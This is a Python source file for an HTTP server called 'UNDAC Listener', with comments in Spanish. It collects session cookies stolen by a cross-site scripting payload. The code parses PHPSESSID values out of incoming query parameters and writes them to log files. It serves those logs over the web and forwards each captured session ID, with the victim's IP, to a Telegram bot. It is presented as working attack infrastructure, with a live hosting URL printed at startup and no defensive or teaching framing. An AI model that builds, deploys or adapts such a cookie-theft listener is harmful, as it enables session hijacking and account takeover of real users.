from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote
import os
from datetime import datetime
import sys
import urllib.request
import urllib.parse
import threading
import re

PORT = int(os.environ.get("PORT", 8000))
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

def send_telegram_message(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    
    def send_async():
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            data = urllib.parse.urlencode({
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message
            }).encode()
            
            req = urllib.request.Request(url, data=data)
            with urllib.request.urlopen(req, timeout=10) as response:
                response.read()
        except:
            pass
    
    thread = threading.Thread(target=send_async)
    thread.daemon = True
    thread.start()

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == "/ping":
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"pong")
            return
        
        print(f"\n{'='*80}", file=sys.stderr, flush=True)
        print(f"[{datetime.now()}] Peticion recibida:", file=sys.stderr, flush=True)
        print(f"Path: {self.path}", file=sys.stderr, flush=True)
        print(f"IP: {self.client_address[0]}", file=sys.stderr, flush=True)
        
        query = parse_qs(parsed_path.query)
        
        # ========== FUNCION 1: Captura desde parámetro 'c' ==========
        # Para XSS que envia: ?c=PHPSESSID%3Dabc123... (con %3D para =)
        c_value = query.get('c', [''])[0]
        
        if c_value:
            print(f"Captura Funcion 1 - Parametro c: {c_value[:200]}", file=sys.stderr, flush=True)
            
            # Decodificar URL (convierte %3D a =, %3B a ;, etc.)
            decoded_cookies = unquote(c_value)
            print(f"Decodificado: {decoded_cookies[:200]}", file=sys.stderr, flush=True)
            
            # Buscar PHPSESSID de diferentes formas
            phpsessid = None
            
            # Formato 1: PHPSESSID=valor
            if 'PHPSESSID' in decoded_cookies:
                match = re.search(r'PHPSESSID=([^;]+)', decoded_cookies)
                if match:
                    phpsessid = match.group(1)
            
            # Formato 2: Valor directo (sin PHPSESSID=)
            elif len(decoded_cookies) > 20 and '=' not in decoded_cookies:
                # Podría ser solo el valor de PHPSESSID
                phpsessid = decoded_cookies
            
            # Guardar en archivo
            with open('cookies_captured.log', 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"FUNCION 1 - Fecha: {datetime.now()}\n")
                f.write(f"URL: {self.path}\n")
                f.write(f"Parametro c crudo: {c_value}\n")
                f.write(f"Decodificado: {decoded_cookies}\n")
                
                if phpsessid:
                    f.write(f"PHPSESSID encontrada: {phpsessid}\n")
                    print(f"PHPSESSID encontrada: {phpsessid}", file=sys.stderr, flush=True)
                    
                    with open('phpsessid.txt', 'a', encoding='utf-8') as pf:
                        pf.write(f"{datetime.now()} - FUNC1 - {phpsessid}\n")
                else:
                    f.write("No se encontro PHPSESSID\n")
            
            # Telegram
            if phpsessid:
                telegram_msg = f"""CAPTURA FUNCION 1 - PHPSESSID
Fecha: {datetime.now()}
PHPSESSID: {phpsessid}
IP: {self.client_address[0]}
URL: {self.path[:100]}"""
                send_telegram_message(telegram_msg)
        
        # ========== FUNCION 2: Captura desde cualquier parámetro ==========
        # Para XSS que envia: ?i=PHPSESSID=abc123... (con = literal)
        elif query:
            print(f"Captura Funcion 2 - Parametros: {dict(query)}", file=sys.stderr, flush=True)
            
            for param_name, param_values in query.items():
                if param_values:
                    param_value = param_values[0]
                    print(f"  Parametro {param_name}: {param_value[:200]}", file=sys.stderr, flush=True)
                    
                    # Decodificar
                    decoded_value = unquote(param_value)
                    
                    # Buscar PHPSESSID en este parámetro
                    phpsessid = None
                    
                    # Si el parámetro contiene PHPSESSID=
                    if 'PHPSESSID=' in decoded_value:
                        match = re.search(r'PHPSESSID=([^;]+)', decoded_value)
                        if match:
                            phpsessid = match.group(1)
                    # O si el parámetro ES el valor de PHPSESSID
                    elif param_name.upper() == 'PHPSESSID':
                        phpsessid = decoded_value
                    
                    # Guardar en archivo alternativo
                    with open('cookies_alternativas.log', 'a', encoding='utf-8') as f:
                        f.write(f"\n{'='*60}\n")
                        f.write(f"FUNCION 2 - Fecha: {datetime.now()}\n")
                        f.write(f"URL: {self.path}\n")
                        f.write(f"Parametro: {param_name}\n")
                        f.write(f"Valor: {decoded_value}\n")
                        
                        if phpsessid:
                            f.write(f"PHPSESSID encontrada: {phpsessid}\n")
                            print(f"PHPSESSID encontrada en param {param_name}: {phpsessid}", file=sys.stderr, flush=True)
                            
                            with open('phpsessid.txt', 'a', encoding='utf-8') as pf:
                                pf.write(f"{datetime.now()} - FUNC2 - {phpsessid}\n")
                        
                        # Telegram para Funcion 2
                        if phpsessid:
                            telegram_msg = f"""CAPTURA FUNCION 2 - PHPSESSID
Fecha: {datetime.now()}
Parametro: {param_name}
PHPSESSID: {phpsessid}
IP: {self.client_address[0]}
URL: {self.path[:100]}"""
                            send_telegram_message(telegram_msg)
        
        # ========== ENDPOINTS WEB ==========
        if self.path == '/' or self.path == '/status':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html = """<html>
<head><title>UNDAC Listener</title></head>
<body>
<h1>Servidor funcionando</h1>
<p>Esperando cookies...</p>
<p><a href="/logs">Ver logs recientes</a></p>
</body></html>"""
            self.wfile.write(html.encode('utf-8'))
            return
        
        elif self.path == '/logs':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            try:
                with open('cookies_captured.log', 'r', encoding='utf-8') as f:
                    logs = f.read()[-5000:]
                html = f"<html><body><h1>Logs Funcion 1</h1><pre>{logs}</pre></body></html>"
                self.wfile.write(html.encode('utf-8'))
            except:
                self.wfile.write(b"<h1>No hay logs</h1>")
            return
        
        elif self.path == '/logs2':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            try:
                with open('cookies_alternativas.log', 'r', encoding='utf-8') as f:
                    logs = f.read()[-5000:]
                html = f"<html><body><h1>Logs Funcion 2</h1><pre>{logs}</pre></body></html>"
                self.wfile.write(html.encode('utf-8'))
            except:
                self.wfile.write(b"<h1>No hay logs alternativos</h1>")
            return
        
        # Respuesta para el XSS (evitar errores)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        pass

print(f"\n{'='*80}", file=sys.stderr, flush=True)
print(f"Servidor UNDAC Listener v2", file=sys.stderr, flush=True)
print(f"Puerto: {PORT}", file=sys.stderr, flush=True)
print(f"URL: https://listener-koyk.onrender.com", file=sys.stderr, flush=True)
print(f"Telegram: {'SI' if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID else 'NO'}", file=sys.stderr, flush=True)
print(f"Hora: {datetime.now()}", file=sys.stderr, flush=True)
print(f"{'='*80}", file=sys.stderr, flush=True)

# Iniciar Telegram
if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
    send_telegram_message(f"Servidor UNDAC iniciado - {datetime.now()}")

# Iniciar servidor
with HTTPServer(("", PORT), RequestHandler) as httpd:
    print(f"Esperando cookies...", file=sys.stderr, flush=True)
    httpd.serve_forever()